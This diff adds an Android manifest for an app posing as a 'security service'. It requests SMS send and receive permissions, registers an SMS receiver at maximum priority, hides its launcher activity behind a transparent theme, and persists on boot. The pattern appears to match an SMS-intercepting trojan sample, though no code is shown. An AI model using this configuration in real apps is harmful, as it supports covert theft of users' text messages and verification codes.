@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="internalOnly" package="com.security.service">
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <application android:debuggable="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:theme="@style/AppTheme">
+        <activity android:name="com.security.service.MainActivity" android:theme="@style/Theme.Transparent">
+            <intent-filter>
+                <category android:name="android.intent.category.LAUNCHER"/>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity>
+        <receiver android:enabled="true" android:name="com.security.service.receiver.ActionReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <category android:name="android.intent.category.HOME"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:name="com.security.service.receiver.SmsReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:name="com.security.service.receiver.RebootReceiver" android:permission="android.permission.REBOOT">
+            <intent-filter>
+                <action android:name="android.intent.action.REBOOT"/>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
